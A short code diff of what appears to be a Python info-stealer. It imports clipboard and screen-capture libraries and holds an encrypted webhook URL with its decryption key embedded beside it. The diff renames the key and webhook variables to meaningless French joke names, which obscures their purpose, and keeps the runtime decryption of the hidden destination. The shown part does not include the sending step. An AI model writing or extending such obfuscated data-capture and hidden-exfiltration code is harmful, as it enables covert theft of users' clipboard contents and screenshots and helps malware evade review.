@@ -21,24 +21,23 @@ import pyperclip
 from PIL import ImageGrab
 from cryptography.fernet import Fernet
 
-# Clé secrète générée
-SECRET_KEY = b"LmX2yw7HlQEWeu_WVgwK-Txe-_pvd2g1WmhplMZqF7o="
+TAGRANDMERE = b"LmX2yw7HlQEWeu_WVgwK-Txe-_pvd2g1WmhplMZqF7o="
 
 # Webhook chiffré
-ENCRYPTED_WEBHOOK = b"gAAAAABnTPEMAVxlsZjU1FCCGKwA_l90-eJm5GAE2RchtjBlsMiq8cbZbU-prdmtUc1dfh3QAQ0sgbK6rHxn4-NanLsrSQBr7O_gBQZKRVVgnpLe77qRnQbAFAhL-UM_cEklyO7YuEjn-shvpIlcQUJ78IMNnirnf6UXzUbc5W8xCBncOqG0sKdwAl2jaZ6Gfzj3CuwFj8_n5cWuHoRkWuT2ecZaq_ya2DZ5N1FiDXr6qOvRibRsxBA="
+LESPATATES = b"gAAAAABnTPEMAVxlsZjU1FCCGKwA_l90-eJm5GAE2RchtjBlsMiq8cbZbU-prdmtUc1dfh3QAQ0sgbK6rHxn4-NanLsrSQBr7O_gBQZKRVVgnpLe77qRnQbAFAhL-UM_cEklyO7YuEjn-shvpIlcQUJ78IMNnirnf6UXzUbc5W8xCBncOqG0sKdwAl2jaZ6Gfzj3CuwFj8_n5cWuHoRkWuT2ecZaq_ya2DZ5N1FiDXr6qOvRibRsxBA="
 
-def decrypt_webhook(encrypted_webhook, key):
+def decrypt_webhook(lespatates, key):
     """Déchiffre le webhook avec AES (Fernet)."""
     try:
         cipher = Fernet(key)
-        decrypted_webhook = cipher.decrypt(encrypted_webhook).decode()
-        return decrypted_webhook
+        lesdeuxpatates = cipher.decrypt(lespatates).decode()
+        return lesdeuxpatates
     except Exception as e:
         raise ValueError(f"Erreur lors du déchiffrement du webhook : {e}")
 
 try:
     # Décoder le webhook
-    WEBHOOK_URL = decrypt_webhook(ENCRYPTED_WEBHOOK, SECRET_KEY)
+    WEBHOOK_URL = decrypt_webhook(LESPATATES, TAGRANDMERE)
     print(f"Webhook décodé avec succès : {WEBHOOK_URL[:30]}...")  # Affiche partiellement pour la sécurité
 except ValueError as e:
     print(f"Erreur : {e}")
